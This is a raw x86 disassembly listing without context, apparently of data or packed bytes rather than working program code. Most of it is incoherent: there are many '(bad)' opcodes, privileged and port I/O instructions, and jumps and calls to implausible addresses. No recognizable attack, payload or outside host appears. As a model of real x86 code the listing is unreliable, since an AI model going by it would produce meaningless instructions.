  4059c1:	test   BYTE PTR [esi],dl
  4059c3:	xchg   bh,ah
  4059c5:	repz mov ah,BYTE PTR fs:[edi+0x3a78e902]
  4059cd:	sar    bh,0x85
  4059d0:	pop    eax
  4059d1:	mov    eax,DWORD PTR [eax]
  4059d3:	jmp    0x405a29
  4059d5:	cmp    edi,0xffffffe9
  4059d8:	cwde   
  4059d9:	sbb    eax,0x335f2b8d
  4059de:	push   0x425fac
  4059e3:	sar    DWORD PTR [eax],0x62
  4059e6:	add    cl,ch
  4059e8:	das    
  4059e9:	inc    ebx
  4059ea:	jne    0x4059d8
  4059ec:	cmp    eax,0xa4e90051
  4059f1:	jne    0x405988
  4059f3:	stos   DWORD PTR es:[edi],eax
  4059f4:	sub    DWORD PTR [ebx-0x299aa301],eax
  4059fa:	dec    edi
  4059fb:	adc    DWORD PTR [edx],edi
  4059fd:	(bad)  
  4059fe:	inc    eax
  4059ff:	jmp    0xe9e0ec20
  405a04:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405a05:	idiv   DWORD PTR [edi-0x6b6617ec]
  405a0b:	jmp    0x88a85cb4
  405a10:	sti    
  405a11:	inc    ecx
  405a12:	add    BYTE PTR [esi-0x60],dh
  405a15:	mul    bh
  405a17:	jbe    0x405a2e
  405a19:	cmp    edi,0x74
  405a1c:	push   eax
  405a1d:	sar    dh,0x5e
  405a20:	and    dh,BYTE PTR [ebp+0x52]
  405a23:	add    eax,0x0
	...
  405a38:	add    BYTE PTR [ebp+0x32],dh
  405a3b:	call   0xffc35052
  405a40:	cdq    
  405a41:	sub    edi,eax
  405a43:	setns  BYTE PTR [ebx]
  405a46:	clc    
  405a47:	pop    es
  405a48:	inc    ecx
  405a49:	xchg   ebp,eax
  405a4a:	cmp    edi,0xcf392b2e
  405a50:	sub    ch,BYTE PTR es:[esi+0x63]
  405a54:	ins    BYTE PTR es:[edi],dx
  405a55:	in     eax,0x2e
  405a57:	mov    DWORD PTR [edi+edx*8-0x80],ebp
  405a5b:	dec    DWORD PTR [esi]
  405a5d:	mov    edx,DWORD PTR [esi+0x30]
  405a60:	add    BYTE PTR [edi],cl
  405a62:	push   es
  405a63:	push   DWORD PTR [ebp-0x776e]
  405a69:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405a6a:	iret   
  405a6b:	mov    al,ds:0xbf7b3e00
  405a70:	je     0x405a02
  405a72:	push   ds
  405a73:	loope  0x405a9d
  405a75:	pop    DWORD PTR [esi]
  405a77:	push   DWORD PTR [ebp+0x4a]
  405a7a:	sahf   
  405a7b:	test   eax,0xff8759d2
  405a80:	mov    ch,0xa2
  405a82:	xchg   edi,edi
  405a84:	(bad)  
  405a85:	mov    esi,0x59d2f19e
  405a8a:	xchg   DWORD PTR [eax+0x50],edx
  405a8d:	jge    0x405a97
  405a8f:	adc    BYTE PTR [eax],al
  405a91:	mov    ds:0xdeb36779,al
  405a96:	(bad)  
  405a97:	dec    DWORD PTR [edi+0x26]
  405a9a:	jmp    DWORD PTR [eax+0x0]
	...
  405ab0:	add    BYTE PTR [eax],al
  405ab2:	(bad)  
  405ab3:	call   0x0:0x5cfb805
  405aba:	test   BYTE PTR [ebx-0x41],bh
  405abd:	je     0x405a86
  405abf:	xor    edi,edi
  405ac1:	jne    0x405a89
  405ac3:	popf   
  405ac4:	xchg   esi,eax
  405ac5:	dec    BYTE PTR [ecx-0x7a]
  405ac8:	call   0xffc6e39e
  405acd:	lea    eax,[ebx+0x43]
  405ad0:	(bad)  
  405ad1:	call   FWORD PTR [ecx+0x35]
  405ad4:	push   DWORD PTR [ebp-0x78d6]
  405ada:	idiv   BYTE PTR [esi]
  405adc:	mov    al,ds:0xc0007e00
  405ae1:	lsl    esi,WORD PTR [esi-0x2]
  405ae5:	dec    ecx
  405ae7:	xchg   BYTE PTR [ebp-0x796744],dh
  405aed:	call   0xa3b099
  405af2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405af3:	adc    BYTE PTR [esi-0x48],cl
  405af6:	popa   
  405af7:	or     BYTE PTR [eax+ebp*8-0x7bcefa],al
  405afe:	pop    esi
  405aff:	sub    eax,0xe4f3fff7
  405b04:	xchg   esi,eax
  405b05:	sub    DWORD PTR [ebx+0x67],0x4b
  405b09:	inc    ebp
  405b0a:	cmp    ebp,DWORD PTR [ebx+0x3]
  405b0d:	add    BYTE PTR [edi+0x3f0bf958],ah
  405b13:	mov    eax,0xff56
	...
  405b28:	add    BYTE PTR [eax],al
  405b2a:	add    BYTE PTR [eax],ah
  405b2c:	je     0x405b71
  405b2e:	je     0x405aed
  405b30:	repnz enter 0x10fb,0x3e
  405b35:	adc    al,0xff
  405b37:	xchg   edx,eax
  405b38:	scas   eax,DWORD PTR es:[edi]
  405b39:	ins    BYTE PTR es:[edi],dx
  405b3a:	adc    eax,0x5083a7d5
  405b3f:	clc    
  405b40:	adc    eax,0xa982e880
  405b45:	cmp    edi,0x18
  405b48:	sub    BYTE PTR es:[edx-0x5a],0x88
  405b4d:	stc    
  405b4e:	sti    
  405b4f:	fdiv   DWORD PTR [ebp+0xb]
  405b52:	call   0xffc354f2
  405b57:	enter  0x7f75,0xe8
  405b5b:	pop    edx
  405b5c:	cmp    DWORD PTR [ebx+0x102ceeff],eax
  405b62:	add    BYTE PTR [edx-0x1c],bl
  405b65:	outs   dx,DWORD PTR ds:[esi]
  405b66:	and    ebx,0xa0ff81da
  405b6c:	push   esp
  405b6d:	add    ebp,DWORD PTR [edx-0x5c]
  405b70:	inc    eax
  405b71:	stc    
  405b72:	pop    es
  405b73:	jg     0x405b33
  405b75:	dec    esi
  405b76:	dec    DWORD PTR [eax+0xffbc8e3]
  405b7c:	add    ebp,ebp
  405b7e:	add    al,0xa7
  405b80:	add    ch,BYTE PTR [ecx+ecx*4+0x78]
  405b84:	adc    DWORD PTR [esi],0x356ad783
  405b8a:	mov    ds:0x43f202a7,eax
	...
  405ba3:	add    BYTE PTR [eax-0x58fbb57a],ch
  405ba9:	add    dh,BYTE PTR [edi+eax*1+0x12e902a6]
  405bb0:	sub    BYTE PTR [ebx-0x1558fc17],bl
  405bb6:	mov    cl,0x33
  405bb8:	out    0x2,al
  405bba:	mov    BYTE PTR fs:[eax],dh
  405bbd:	or     esi,0x8a6a7782
  405bc3:	push   esp
  405bc4:	sbb    BYTE PTR [eax-0x7ee87790],al
  405bca:	mov    dh,0x82
  405bcc:	or     BYTE PTR [esi-0x7fff7e47],dh
  405bd2:	adc    DWORD PTR [eax],ecx
  405bd4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405bd5:	add    ch,cl
  405bd7:	nop
  405bd8:	sub    bh,BYTE PTR [eax-0x69]
  405bdb:	sub    al,0xd2
  405bde:	add    BYTE PTR [edi-0x71],ah
  405be1:	shr    eax,0xeb
  405be4:	clc    
  405be5:	xor    ch,BYTE PTR [eax]
  405be7:	add    al,0x3f
  405be9:	pop    ecx
  405bea:	mov    ecx,0x6367c8c4
  405bef:	mov    ds:0x43f202a7,al
  405bf4:	xor    edx,DWORD PTR [ecx]
  405bf6:	rol    DWORD PTR [ebx],cl
  405bf8:	and    al,BYTE PTR [esi+0x7fa8815e]
  405bfe:	mov    ecx,0x510b1a82
  405c03:	popf   
  405c04:	call   0x0:0x823e7f
	...
  405c1b:	add    BYTE PTR [eax],al
  405c1d:	pop    edx
  405c1e:	jb     0x405c20
  405c20:	aaa    
  405c21:	and    eax,0xabe5687f
  405c26:	add    al,BYTE PTR [eax]
  405c28:	je     0x405c59
  405c2a:	ja     0x405c2a
  405c2c:	push   ds
  405c2d:	and    eax,0xbc0a67d2
  405c32:	sar    edi,0x80
  405c35:	enter  0x4132,0xe9
  405c39:	dec    esp
  405c3a:	pop    edx
  405c3b:	xor    BYTE PTR [eax+0x564f6aa4],ch
  405c41:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405c42:	add    cl,BYTE PTR [ebx]
  405c44:	sub    DWORD PTR [eax],edi
  405c46:	adc    ch,BYTE PTR [edx-0x17]
  405c49:	sub    DWORD PTR [ebp+0x7f26dff7],eax
  405c4f:	push   eax
  405c50:	(bad)  
  405c51:	xor    BYTE PTR [edi],al
  405c53:	call   0xffbffc86
  405c58:	(bad)  
  405c59:	push   eax
  405c5a:	jb     0x405c5a
  405c5c:	mov    esi,0xa47d6a26
  405c61:	es jg  0x405cce
  405c64:	add    dl,BYTE PTR [ebx+0x26a6d145]
  405c6a:	or     eax,eax
  405c6c:	adc    eax,0xd9b9eac7
  405c71:	in     eax,0x7e
  405c73:	dec    edi
  405c74:	add    DWORD PTR [ecx],0xf386ff52
  405c7a:	call   0xf566757e
  405c7f:	pop    es
  405c80:	add    DWORD PTR [eax],0x0
	...
  405c96:	xchg   ecx,eax
  405c97:	jge    0x405c98
  405c99:	outs   dx,BYTE PTR ds:[esi]
  405c9a:	push   ebx
  405c9b:	fmul   st,st(4)
  405c9d:	es jmp 0x7ee4:0x19a8
  405ca4:	imul   esi,ebx,0x4107f527
  405caa:	push   ecx
  405cab:	jge    0x405cac
  405cad:	add    cl,ah
  405caf:	outs   dx,BYTE PTR ds:[esi]
  405cb0:	test   al,0x30
  405cb2:	aas    
  405cb3:	add    ch,BYTE PTR [edx+0x23]
  405cb6:	shl    DWORD PTR [ebp+0x7],1
  405cb9:	call   0x3fdd93
  405cbe:	push   ss
  405cbf:	test   eax,0x707e4130
  405cc4:	sbb    edi,edi
  405cc6:	or     ecx,DWORD PTR [edx]
  405cc8:	call   0xffc40d59
  405ccd:	(bad)  
  405cce:	(bad)  
  405cd0:	(bad)  
  405cd1:	jne    0x405d29
  405cd3:	jmp    0xc2c9:0x8351ca9b
  405cda:	dec    edx
  405cdb:	add    dl,BYTE PTR [ebp-0x75]
  405cde:	push   edx
  405cdf:	push   0xffffffff
  405ce1:	jmp    DWORD PTR [ecx+0x44]
  405ce4:	push   DWORD PTR [ebp+0x42]
  405ce7:	xor    DWORD PTR [ebp+0x8],0xffffffe6
  405ceb:	lock in eax,dx
  405ced:	jmp    ecx
  405cef:	enter  0x8c1,0xfe
  405cf3:	push   esp
  405cf4:	mov    ch,ah
  405cf6:	jge    0x405cbd
  405cf8:	test   edi,0x0
	...
  405d0e:	add    bl,cl
  405d10:	add    BYTE PTR [eax],0x0
  405d13:	push   cs
  405d14:	add    cl,BYTE PTR [ebp+0x67521245]
  405d1a:	repz into 
  405d1c:	inc    eax
  405d1d:	(bad)  
  405d1e:	(bad)  
  405d1f:	mov    ebx,0xde35ff12
  405d24:	sub    BYTE PTR [ecx+0x0],al
  405d27:	ss sti 
  405d29:	into   
  405d2a:	call   DWORD PTR [ecx+0xe]
  405d2d:	shl    BYTE PTR [eax+esi*8-0x78],0x45
  405d32:	clc    
  405d33:	(bad)  
  405d34:	add    BYTE PTR [eax],al
  405d36:	out    dx,eax
  405d37:	adc    BYTE PTR [ebx-0x2b58038b],al
  405d3d:	cmc    
  405d3e:	mul    DWORD PTR [eax-0x217f4aa]
  405d44:	aad    0x7f
  405d46:	call   DWORD PTR [eax+0x4ae87bb6]
  405d4c:	daa    
  405d4d:	cmp    bh,0x6e
  405d50:	sub    DWORD PTR [ebx],ecx
  405d52:	add    dl,dl
  405d54:	lock outs dx,BYTE PTR ds:[esi]
  405d56:	sub    DWORD PTR [ebx-0x29],0x2c68ff80
  405d5d:	xchg   BYTE PTR [eax+0x800c61],bh
  405d63:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405d64:	imul   eax,DWORD PTR [ebx],0xffffff8b
  405d67:	jmp    0x836e:0xd3c00c6f
  405d6e:	cmp    BYTE PTR [edi+0xe905f6],ah
	...
  405d88:	mov    ds:0x3000036a,eax
  405d8d:	(bad)  
  405d8e:	adc    edi,edi
  405d90:	mov    dl,0x67
  405d92:	imul   ebp,DWORD PTR [ecx],0xfffffff7
  405d95:	dec    ebx
  405d96:	jg     0x405de8
  405d98:	ja     0x405dde
  405d9a:	stc    
  405d9b:	pop    es
  405d9c:	inc    esp
  405d9e:	jle    0x405d9f
  405da0:	or     BYTE PTR [ebx-0x5],al
  405da3:	retf   
  405da4:	add    BYTE PTR [esp+ebp*8+0x42acbd1],ch
  405dab:	(bad)  
  405dac:	jp     0x405e1d
  405dae:	imul   ecx,DWORD PTR ds:0x897f93d7,0x2a
  405db5:	sar    DWORD PTR [ebp-0x1],cl
  405db8:	fcom   DWORD PTR [edx]
  405dba:	add    DWORD PTR ds:[edi-0x1a7a6f95],esp
  405dc1:	hlt    
  405dc2:	jle    0x405dc3
  405dc4:	push   edi
  405dc5:	or     DWORD PTR [ecx+0x6601b8cc],0xffffff91
  405dcc:	sub    al,BYTE PTR [eax+0x5f]
  405dcf:	jg     0x405d79
  405dd1:	rcl    DWORD PTR [ebp-0x47],1
  405dd4:	pop    edi
  405dd5:	jge    0x405e25
  405dd7:	jg     0x405d68
  405dd9:	inc    edx
  405dda:	fs add al,0xa7
  405ddd:	mov    DWORD PTR [eax+eax*8-0x77],esp
  405de1:	jl     0x405e19
  405de3:	les    esi,FWORD PTR [ecx-0x58fb797a]
  405de9:	add    dh,BYTE PTR [ecx+ebx*4+0x0]
	...
  405e01:	gs jge 0x405e22
  405e04:	jg     0x405e76
  405e06:	add    ecx,edi
  405e08:	add    esp,DWORD PTR [edi+0x2bf79502]
  405e0e:	xchg   esi,eax
  405e0f:	sub    edi,DWORD PTR [esi+0x50]
  405e12:	jl     0x405e80
  405e14:	ret    0xd27c
  405e17:	adc    BYTE PTR [eax-0x6d],0xc1
  405e1b:	call   0xe9de7d8b
  405e20:	add    ebx,DWORD PTR [edx+eax*2-0x26c3fdac]
  405e27:	arpl   WORD PTR [eax+0x7ece7ce5],bx
  405e2d:	sub    al,cl
  405e2f:	adc    al,0xd4
  405e31:	mov    BYTE PTR [ebx+0xd],cl
  405e34:	lds    ecx,FWORD PTR [eax]
  405e36:	fs aaa 
  405e38:	mov    eax,ds:0x43e202a7
  405e3d:	jb     0x405e3f
  405e3f:	xchg   edx,eax
  405e40:	ret    
  405e41:	and    edx,DWORD PTR [esi+0x7be87dab]
  405e47:	ror    DWORD PTR fs:[ecx+ecx*4+0x7bd9b764],0x86
  405e50:	jmp    0x405e19
  405e52:	sub    ch,BYTE PTR [eax]
  405e54:	add    al,0xc8
  405e56:	cmc    
  405e57:	jmp    esp
  405e59:	dec    esp
  405e5a:	stc    
  405e5b:	into   
  405e5c:	outs   dx,BYTE PTR ds:[esi]
  405e5d:	cmp    DWORD PTR [ebx-0x4b],edi
  405e60:	popf   
  405e61:	xor    bh,BYTE PTR [ebx-0x1]
  405e64:	mov    ecx,0x0
	...
  405e79:	add    BYTE PTR [ecx+eax*2],bh
  405e7c:	iret   
  405e7d:	push   esi
  405e7e:	and    DWORD PTR [ebp+esi*2-0x7],edi
  405e82:	je     0x405ee7
  405e84:	mov    eax,0x507c1136
  405e89:	cdq    
  405e8a:	or     esi,esi
  405e8c:	pop    es
  405e8d:	inc    ecx
  405e8e:	dec    ebx
  405e8f:	jl     0x405e90
  405e91:	cs or  al,0xb5
  405e94:	retf   
  405e95:	es icebp 
  405e97:	lea    eax,[ebp-0x8415d5]
  405e9d:	mov    ecx,0xfbcb5e1
  405ea2:	fnstcw WORD PTR [ebx-0x18]
  405ea5:	aad    0x7
  405ea7:	add    al,BYTE PTR [eax]
  405ea9:	fs in  al,0xb
  405eac:	test   DWORD PTR [ebp-0x1100843f],ecx
  405eb2:	lock mov ebp,0x6ab2e6fe
  405eb8:	pop    ds
  405eb9:	jl     0x405e5e
  405ebb:	add    bh,bh
  405ebd:	pushf  
  405ebe:	arpl   WORD PTR [edi+edi*8-0x32],di
  405ec2:	mov    eax,DWORD PTR [ebx+ecx*8-0x3db66d3a]
  405ec9:	in     eax,dx
  405eca:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405ecb:	aad    0x8a
  405ecd:	lds    esp,FWORD PTR [esi]
  405ecf:	inc    esi
  405ed0:	cld    
  405ed1:	scas   al,BYTE PTR es:[edi]
  405ed2:	lock push es
  405ed4:	call   0xffbbc183
  405ed9:	jo     0x405ebb
  405edb:	jbe    0x405ee8
  405edd:	test   eax,0x0
	...
  405ef2:	add    BYTE PTR [edx-0x5b16737a],dh
  405ef8:	add    ch,BYTE PTR [eax+0x0]
  405efb:	div    DWORD PTR [eax]
  405efd:	inc    ecx
  405efe:	add    BYTE PTR [ecx+0x73],cl
  405f01:	sti    
  405f02:	call   0x3f2b3c
  405f07:	sahf   
  405f08:	outs   dx,BYTE PTR ds:[esi]
  405f09:	jns    0x405f3d
  405f0b:	(bad)  
  405f0c:	dec    BYTE PTR [edi-0x1]
  405f0f:	rol    DWORD PTR [esi],cl
  405f11:	call   0xff3857aa
  405f16:	call   0x3f2a61
  405f1b:	jbe    0x405f55
  405f1d:	xor    al,BYTE PTR [ecx+0x7e]
  405f20:	div    DWORD PTR [esp+edi*8-0x1a]
  405f24:	fmul   st(5),st
  405f26:	dec    ecx
  405f28:	dec    esi
  405f29:	addr16 jp 0x405f78
  405f2c:	inc    ebp
  405f2d:	dec    DWORD PTR [edi-0x77]
  405f30:	jno    0x405f39
  405f32:	call   0x3f5774
  405f37:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405f38:	pop    ds
  405f39:	retf   
  405f3a:	jmp    FWORD PTR [ecx-0xcda99a]
  405f40:	add    eax,0xee3a75ff
  405f45:	mov    eax,0x4ff749ce
  405f4a:	push   0x4134c4
  405f4f:	outs   dx,BYTE PTR ds:[esi]
  405f50:	div    DWORD PTR [eax+ecx*1-0x1a]
  405f54:	push   ebx
  405f55:	std    
  405f56:	inc    DWORD PTR [eax]
	...
  405f6c:	jmp    0xea0b655e
  405f71:	mul    BYTE PTR [edi+0x71]
  405f74:	or     al,0x45
  405f76:	(bad)  
  405f77:	inc    bl
  405f79:	sub    al,0x98
  405f7c:	sbb    bh,dh
  405f7e:	(bad)  
  405f7f:	push   eax
  405f80:	xchg   esi,eax
  405f81:	jl     0x405fb4
  405f83:	inc    ecx
  405f84:	(bad)  
  405f85:	push   ebp
  405f86:	(bad)  
  405f87:	jne    0x405f30
  405f89:	arpl   WORD PTR [ebx+0x31],bp
  405f8c:	(bad)  [eax-0x4a351784]
  405f92:	jl     0x405f93
  405f94:	enter  0x7f6e,0xe8
  405f98:	loop   0x405f3f
  405f9a:	jl     0x405f9b
  405f9c:	out    dx,al
  405f9d:	lods   eax,DWORD PTR ds:[esi]
  405f9e:	or     eax,DWORD PTR [eax]
  405fa0:	pop    edx
  405fa1:	hlt    
  405fa2:	outs   dx,BYTE PTR ds:[esi]
  405fa3:	and    ebx,0xffffffd7
  405fa6:	shr    DWORD PTR [ecx-0x59],cl
  405fa9:	inc    ebp
  405faa:	pop    es
  405fab:	call   DWORD PTR [edx]
  405fad:	fs imul edi,esi,0x68
  405fb1:	sar    BYTE PTR [ebx-0x77],0xe2
  405fb5:	aaa    
  405fb6:	mov    BYTE PTR ds:0xffc3032e,bh
  405fbc:	clc    
  405fbd:	push   0x93ac7403
  405fc2:	push   0xd46be630
  405fc7:	out    0xee,eax
  405fc9:	out    dx,al
  405fca:	add    al,BYTE PTR [eax]
  405fcc:	lods   al,BYTE PTR ds:[esi]
  405fcd:	sub    esi,edi
  405fcf:	sbb    eax,0x0
	...
  405fe4:	add    al,bh
  405fe6:	adc    ebp,edi
  405fe8:	ror    DWORD PTR [eax+0x78],cl
  405feb:	pop    es
  405fec:	sar    BYTE PTR [ebx-0x42982ca9],0xbd
  405ff3:	ret    0xe0ff
  405ff6:	pusha  
  405ff7:	icebp  
  405ff8:	pop    es
  405ff9:	aas    
  405ffa:	mov    al,0x79
  405ffc:	jmp    DWORD PTR [eax]
  405ffe:	inc    ebx
  405fff:	(bad)
  406003:	js     0x406038
  406005:	out    0x81,eax
  406007:	jnp    0x406008
  406009:	or     BYTE PTR [eax+0x68bfae76],bh
  40600f:	lock les ecx,FWORD PTR [ebp-0x608a85ab]
  406016:	add    dl,BYTE PTR [ecx-0x6187168b]
  40601c:	out    dx,al
  40601d:	test   DWORD PTR [ecx+0x1c],edi
  406020:	or     al,0xcf
  406022:	pusha  
  406023:	(bad)  
  406024:	jnp    0x405ff6
  406026:	jmp    0x40600c
  406028:	jp     0x40607c
  40602a:	or     dl,BYTE PTR [ecx+0x7678c159]
  406030:	out    dx,al
  406031:	cmp    BYTE PTR [ecx-0xc],0xb
  406035:	mov    edi,0xa87b6754
  40603a:	jmp    0x326949a
  40603f:	push   esi
  406040:	icebp  
  406041:	mov    al,ds:0x9078a46a
  406046:	js     0x406019
  406048:	add    BYTE PTR cs:[eax],al
	...
  40605b:	add    BYTE PTR [eax],al
  40605d:	add    dh,dl
  40605f:	shr    eax,0x7a
  406062:	cli    
  406063:	or     al,BYTE PTR [ecx+0x3c]
  406066:	jp     0x4060e0
  406068:	cs in  al,dx
  40606a:	pop    es
  40606b:	xor    ch,BYTE PTR [eax-0xf1197fd]
  406071:	imul   ecx,DWORD PTR [ebp+esi*2-0x783084ea],0xffffffd8
  406079:	les    edx,FWORD PTR [eax+0x79]
  40607c:	jl     0x406089
  40607e:	aas    
  40607f:	sbb    esp,edi
  406081:	jp     0x4060c3
  406083:	jmp    0x4060b0
  406085:	xor    eax,0xf0ee02e6
  40608a:	test   al,0x6a
  40608c:	clc    
  40608d:	js     0x4060b7
  40608f:	js     0x4060e2
  406091:	ja     0x406069
  406093:	shr    eax,0x7a
  406096:	xchg   edx,eax
  406097:	or     al,cl
  406099:	call   DWORD PTR [ebx]
  40609b:	js     0x406063
  40609d:	jp     0x406031
  40609f:	jbe    0x40605f
  4060a1:	lock test al,0x6a
  4060a4:	add    BYTE PTR [ebx],dh
  4060a6:	fs ja  0x4060a8
  4060a9:	push   cs
  4060aa:	bound  eax,QWORD PTR [esp+eax*1-0x17]
  4060ae:	xlat   BYTE PTR ds:[ebx]
  4060af:	mov    esp,gs
  4060b1:	push   0xffffffdf
  4060b3:	or     eax,DWORD PTR [eax]
  4060b5:	sbb    eax,0xf97577b5
  4060ba:	dec    ebp
  4060bb:	in     eax,dx
  4060bc:	or     eax,DWORD PTR [esi-0x4c180029]
	...
  4060d6:	add    BYTE PTR [ecx+0x77],dl
  4060d9:	push   DWORD PTR [esi-0x49]
  4060dc:	or     ebp,eax
  4060de:	xchg   ecx,eax
  4060df:	arpl   WORD PTR [edi-0x1],si
  4060e2:	xor    BYTE PTR [edx+0x6],ah
  4060e5:	add    BYTE PTR [ecx+esi*1+0x102d8366],dh
  4060ec:	in     eax,dx
  4060ed:	dec    DWORD PTR [ebp-0x69]
  4060f0:	adc    edi,edi
  4060f2:	mov    esp,0xed7577b4
  4060f7:	or     al,0x51
  4060f9:	int3   
  4060fa:	ss std 
  4060fc:	or     eax,eax
  4060fe:	mov    ch,0x58
  406100:	mov    al,BYTE PTR [ebp+0x25]
  406103:	jl     0x406171
  406105:	xor    ch,BYTE PTR [eax+0x157577a4]
  40610b:	int3   
  40610c:	leave  
  40610d:	int3   
  40610e:	push   cs
  40610f:	int    0xea
  406111:	(bad)  
  406112:	call   0xfe9119d4
  406117:	push   eax
  406118:	jmp    edi
  40611a:	dec    esp
  40611b:	mov    ebp,0xb681ff77
  406120:	xor    al,0x41
  406122:	jmp    0xd23c4ed6
  406127:	int    0x45
  406129:	call   esi
  40612b:	or     eax,DWORD PTR [edx]
  40612d:	add    BYTE PTR [esi+0xfed24d],bh
  406133:	retf   
  406134:	push   es
  406135:	call   0xff39a2c4
  40613a:	push   0x0
	...
  40614f:	add    BYTE PTR [edi],cl
  406151:	cs inc ecx
  406153:	add    BYTE PTR [ecx+0x67],al
  406156:	sti    
  406157:	call   0x3f2149
  40615c:	mov    dh,0x0
  40615e:	add    bh,ch
  406160:	jo     0x4061b0
  406162:	(bad)  
  406163:	jne    0x40612b
  406165:	jmp    0x75fe:0xf921ff6e
  40616c:	inc    edx
  40616d:	out    0x5d,al
  40616f:	leave  
  406170:	xor    ecx,edi
  406172:	enter  0xcec2,0x2
  406176:	push   ebp
  406177:	mov    edx,DWORD PTR [edx+0x66]
  40617a:	or     eax,0xff024f33
  40617f:	jne    0x406103
  406181:	jmp    0x75fe:0xfbe1cce8
  406188:	outs   dx,BYTE PTR ds:[esi]
  406189:	push   edx
  40618a:	out    0x34,eax
  40618c:	sar    ebx,cl
  40618e:	(bad)  
  40618f:	(bad)  
  406190:	cmp    eax,DWORD PTR [esi]
  406192:	push   eax
  406193:	(bad)  
  406194:	cmp    ecx,DWORD PTR [edx]
  406196:	call   0xff3c22d9
  40619b:	push   0x412fa4
  4061a0:	mov    cl,0x65
  4061a2:	or     ebp,eax
  4061a4:	mov    edx,ecx
  4061a6:	(bad)  
  4061a7:	jmp    DWORD PTR [ecx-0x69aff09b]
  4061ad:	or     al,0xcd
  4061af:	push   DWORD PTR [ecx]
  4061b1:	sti    
  4061b2:	je     0x4061c8
	...
  4061c8:	add    BYTE PTR [esi],cl
  4061ca:	sti    
  4061cb:	je     0x4061d5
  4061cd:	push   esi
  4061ce:	push   cs
  4061cf:	(bad)  
  4061d0:	inc    DWORD PTR [ecx]
  4061d2:	leave  
  4061d3:	rcl    DWORD PTR [eax],0xa7
  4061d6:	imul   ecx,esi,0xffffff8a
  4061d9:	add    ebp,ecx
  4061db:	ds cld 
  4061dd:	or     BYTE PTR [edi],dh
  4061df:	or     al,ch
  4061e1:	push   edi
  4061e2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4061e3:	js     0x4061e4
  4061e5:	lods   al,BYTE PTR ds:[esi]
  4061e6:	stos   DWORD PTR es:[edi],eax
  4061e7:	out    dx,eax
  4061e8:	dec    ecx
  4061e9:	push   ds
  4061ea:	pop    ds
  4061eb:	js     0x406255
  4061ed:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4061ee:	imul   ebp,DWORD PTR [eax-0x42],0x4f
  4061f2:	nop
  4061f3:	xor    eax,0xee8ca741
  4061f8:	sti    
  4061f9:	ror    BYTE PTR [esi],1
  4061fb:	or     al,0xe8
  4061fd:	sbb    al,0x7d
  4061ff:	js     0x406200
  406201:	dec    edi
  406202:	push   0x3
  406204:	out    dx,eax
  406205:	stc    
  406206:	add    esi,DWORD PTR [edx+0x32]
  406209:	imul   di,WORD PTR [eax+0x75],0xffab
  40620e:	fsub   st(5),st
  406210:	pop    es
  406211:	(bad)  
  406212:	dec    ebp
  406213:	js     0x406214
  406215:	cwde   
  406216:	inc    ebx
  406217:	add    eax,0xeb858000
  40621c:	add    ah,dl
  40621e:	stos   BYTE PTR es:[edi],al
  40621f:	add    edi,edi
  406221:	cli    
  406222:	aaa    
  406223:	js     0x40629a
  406225:	scas   eax,DWORD PTR es:[edi]
  406226:	ret    
  406227:	loope  0x406227
  406229:	jo     0x40624f
  40622b:	js     0x4062a2
	...
  406241:	add    BYTE PTR [ebx+0x13],ch
  406244:	mov    ah,0xc8
  406246:	pusha  
  406247:	adc    al,0x4a
  406249:	ret    0x6baf
  40624c:	into   
  40624d:	mov    al,BYTE PTR [ebx-0x18]
  406250:	ds cld 
  406252:	mov    ebp,0x4004ed6b
  406257:	out    dx,al
  406258:	or     ch,al
  40625a:	push   edx
  40625b:	es js  0x40625d
  40625e:	push   ds
  40625f:	sahf   
  406260:	ja     0x4062ca
  406262:	jmp    0x406265
  406264:	sbb    eax,ebp
  406266:	and    ch,bl
  406268:	push   0x32
  40626a:	data16 add dl,dh
  40626d:	xor    DWORD PTR [edi+0x804282b],edx
  406273:	out    dx,eax
  406274:	lock imul edx,DWORD PTR [ecx+0x74],0xffffffbe
  406279:	ja     0x40620a
  40627b:	inc    esp
  40627c:	sti    
  40627d:	(bad)  
  40627e:	lock fcom QWORD PTR [esi+0x32]
  406282:	data16 add ah,BYTE PTR [esi+0x282b5731]
  406289:	add    al,0xd8
  40628b:	out    dx,al
  40628c:	loopne 0x4062f9
  40628e:	cmp    DWORD PTR [esi+ecx*4+0x77],esi
  406292:	aas    
  406293:	push   ecx
  406294:	mov    ebx,0x6adcc0c4
  406299:	xor    ah,BYTE PTR [esi+0x2]
  40629c:	jbe    0x4062cf
  40629e:	aaa    
  40629f:	sub    ebp,DWORD PTR [eax]
  4062a1:	add    al,0xa8
  4062a3:	out    dx,al
  4062a4:	lock imul eax,DWORD PTR [eax],0x0
	...
  4062b8:	add    BYTE PTR [eax],al
  4062ba:	add    BYTE PTR [ecx],ah
  4062bc:	jne    0x40631c
  4062be:	ja     0x4062cf
  4062c0:	arpl   WORD PTR [ebx],bx
  4062c2:	lds    edx,FWORD PTR [eax-0x19cd9524]
  4062c8:	add    al,BYTE PTR [esi+0x31]
  4062cb:	imul   DWORD PTR [ecx]
  4062cd:	test   al,0x3
  4062cf:	js     0x4062bf
  4062d1:	loopne 0x40633e
  4062d3:	or     DWORD PTR [ebp+0x2e],esi
  4062d6:	ja     0x4062d7
  4062d8:	mov    dh,0xdb
  4062da:	les    esp,FWORD PTR [eax-0x24]
  4062dd:	push   eax
  4062de:	xor    ah,dh
  4062e0:	add    dl,BYTE PTR [esi]
  4062e2:	xor    edi,edx
  4062e4:	sub    DWORD PTR [eax-0xf11b7fd],ebp
  4062ea:	imul   esi,ecx,0x74
  4062ed:	(bad)  
  4062ee:	jbe    0x4062bf
  4062f0:	inc    esp
  4062f1:	add    BYTE PTR [ebx+0x4167746b],bh
  4062f7:	jne    0x4062ba
  4062f9:	jmp    ebp
  4062fb:	xlat   BYTE PTR ds:[ebx]
  4062fc:	repnz sub BYTE PTR [eax],ch
  4062ff:	mov    ds:0x7ce17573,eax
  406304:	sub    al,0xfe
  406306:	into   
  406307:	xchg   ecx,eax
  406308:	jmp    0x9167:0x73ebfbd2
